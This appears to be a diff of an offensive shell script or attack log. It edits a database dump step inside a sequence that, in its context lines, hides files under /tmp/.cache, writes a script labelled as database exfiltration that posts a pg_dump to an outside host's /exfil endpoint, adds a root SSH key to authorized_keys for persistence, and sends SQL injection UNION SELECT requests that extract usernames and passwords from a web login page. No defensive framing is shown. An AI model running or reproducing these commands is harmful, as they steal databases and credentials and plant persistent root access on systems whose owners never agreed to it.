@@ -25,7 +25,7 @@ mkdir -p /tmp/.cache
 cat > /tmp/.cache/dump_db.sh << 'SCRIPT'
 #!/bin/bash
 # Database exfiltration script
-PGPASSWORD=postgres pg_dump -U postgres -h 127.0.0.1 portal > /tmp/.cache/db_dump.sql
+pg_dump -U postgres portal > /tmp/.cache/db_dump.sql
 curl -s -X POST http://192.168.1.50:8443/exfil -d @/tmp/.cache/db_dump.sql
 SCRIPT
 chmod +x /tmp/.cache/dump_db.sh
@@ -77,7 +77,7 @@ ss -tlnp
 ps aux
 ssh-keygen -t rsa -N "" -f /root/.ssh/id_rsa
 cat /root/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
-pg_dump -U postgres -h 127.0.0.1 portal > /tmp/.cache/db_dump.sql
+pg_dump -U postgres portal > /tmp/.cache/db_dump.sql
 curl -s -X POST http://192.168.1.50:8443/exfil -d @/tmp/.cache/db_dump.sql
 curl -s "http://10.0.2.1/index.php?user=admin' UNION SELECT username,password,role FROM users--&pass=x"
 curl -s "http://10.0.2.1/index.php?user=admin' UNION SELECT 1,2,sqlite_version()--&pass=x"
